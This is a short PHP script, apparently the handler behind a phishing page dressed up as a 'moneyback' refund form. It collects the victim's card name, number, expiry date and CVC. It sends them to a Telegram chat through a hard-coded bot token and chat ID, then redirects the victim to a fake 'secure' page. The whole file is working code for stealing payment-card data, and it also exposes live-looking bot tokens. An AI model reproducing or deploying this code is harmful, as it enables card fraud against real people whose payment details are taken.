<?php


// https://api.telegram.org/bot5389899824:AAGkJHLwTgMf2qPTIlKbjfQ4u28XPwiDtbw/getUpdates

$cardNameMoneyback = $_POST['moneybackowner'];
$cardNumberMoneyback = $_POST['moneybacknumbercard'];
$validityMoneyback = $_POST['moneybackvalidity'];
$cvcMoneyback = $_POST['moneybackcvc'];
$token = "5314142201:AAHzAGE3S3dQ1zCQlseWjIUO3U8WVvQ02A8";
$chat_id = '-610084593';
$arr = array(
    'Владелец карты: ' => $cardNameMoneyback,
    'Номер карты: ' => $cardNumberMoneyback,
    'Срок действия: ' => $validityMoneyback,
    'CVC: ' => $cvcMoneyback,
);

foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b>".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if($sendToTelegram) {
    header('Location: moneybacksecure.html');
    form.reset();
} else {
    echo "Error";
}
?>